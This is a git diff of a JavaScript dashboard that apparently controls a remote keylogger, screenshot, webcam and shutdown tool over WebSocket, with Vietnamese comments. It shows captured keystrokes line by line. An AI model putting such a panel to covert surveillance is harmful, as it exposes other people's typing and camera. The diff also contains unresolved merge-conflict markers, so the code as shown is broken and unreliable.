@@ -186,10 +186,22 @@ function HandleClientMSG(data) {
     if (data == "webcam") { flag = 2; return; }
     if (data == "Keylogging started") { flag = 3; logKeyToConsole(">>> [SYSTEM] Keylogger Started"); return; }
     if (data == "Keylogging stopped") { flag = 4; logKeyToConsole(">>> [SYSTEM] Keylogger Stopped"); return; }
+<<<<<<< HEAD
 
     if (flag === 5) renderProcessListToTable(data);
     else if (flag == 6) renderAppListToTable(data);
     else logKeyToConsole(data);
+=======
+    if (data === "Keylog") { 
+        flag = 7; 
+        console.log("WTF");
+        return; 
+    }
+
+    if (flag === 5) renderProcessListToTable(data);
+    else if (flag == 6) renderAppListToTable(data);
+    else if (flag == 7) logKeyToConsole(data);
+>>>>>>> tai-phan
 
     if (flag != 3) flag = -1;
 }
@@ -326,6 +338,7 @@ function stopkeyLog() { sendCommand("stop_keylog"); }
 function screenShot() { sendCommand("screenshot"); }
 function webCam() { sendCommand("webcam"); }
 
+<<<<<<< HEAD
 function logKeyToConsole(msg) {
     const consoleBox = document.getElementById("keylogConsole");
     const div = document.createElement("div");
@@ -340,4 +353,81 @@ function logKeyToConsole(msg) {
 }
 function clearConsole() { 
     document.getElementById("keylogConsole").innerHTML = '<div class="console-line system-msg">>> Console cleared.<span class="cursor">_</span></div>'; 
+=======
+// Biến lưu trữ dòng hiện tại
+let currentLogLine = null;
+
+function logKeyToConsole(msg) {
+    const consoleBox = document.getElementById("keylogConsole");
+
+    // Nếu chưa có dòng hiện tại hoặc gặp phím ENTER, tạo một dòng mới
+    if (!currentLogLine || msg.includes("[ENTER]")) {
+        // Nếu là phím ENTER, ta vẫn thêm text vào dòng cũ trước khi kết thúc dòng đó
+        if (currentLogLine && msg.includes("[ENTER]")) {
+            currentLogLine.innerHTML += ` <span style="color: #00ff88">${msg}</span>`;
+            currentLogLine = null; // Reset để phím tiếp theo sẽ vào dòng mới
+            return;
+        }
+
+        // Tạo dòng mới (div)
+        const div = document.createElement("div");
+        div.className = "console-line";
+        
+        // Thêm timestamp cho dòng mới
+        const time = new Date().toLocaleTimeString('en-US', {hour12: false});
+        div.innerHTML = `<span style="color: #555">[${time}]</span> `;
+        
+        consoleBox.appendChild(div);
+        currentLogLine = div; // Gán dòng này là dòng hiện tại để các key sau nối vào
+    }
+
+    // Nếu không phải ENTER, nối key vào dòng hiện tại
+    if (currentLogLine) {
+        // Tạo span để bọc ký tự cho đẹp (tùy chọn)
+        const keySpan = document.createElement("span");
+        
+        // Nếu là các phím chức năng (nằm trong ngoặc vuông []), cho màu khác
+        if (msg.startsWith("[") && msg.endsWith("]")) {
+            keySpan.style.color = "#00ff88"; // Màu xanh cho phím chức năng
+            keySpan.innerText = ` ${msg} `;
+        } else {
+            keySpan.innerText = msg;
+        }
+        
+        currentLogLine.appendChild(keySpan);
+    }
+
+    // Luôn cuộn xuống dưới cùng
+    consoleBox.scrollTop = consoleBox.scrollHeight;
+}
+
+// Cập nhật lại hàm clearConsole để reset biến dòng hiện tại
+function clearConsole() { 
+    document.getElementById("keylogConsole").innerHTML = '<div class="console-line system-msg">>> Console cleared.<span class="cursor">_</span></div>'; 
+    currentLogLine = null; 
+}
+
+// --- SYSTEM CONTROL LOGIC ---
+function confirmSystem(action) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+        alert("Not Connected to Server!");
+        return;
+    }
+
+    const msg = action === 'shutdown' ? 
+        "WARNING: This will SHUTDOWN the remote server immediately. Continue?" : 
+        "Confirm RESTART of the remote server?";
+
+    if (confirm(msg)) {
+        // Gửi chính xác chuỗi mà Backend C++ đang đợi (như trong ảnh bạn cung cấp)
+        if (action === 'shutdown') {
+            sendCommand("shutdown");
+        } else {
+            sendCommand("restart");
+        }
+        
+        // Thông báo cho người dùng biết lệnh đã gửi
+        logKeyToConsole(`>>> [SYSTEM] Sent ${action.toUpperCase()} command.`);
+    }
+>>>>>>> tai-phan
 }
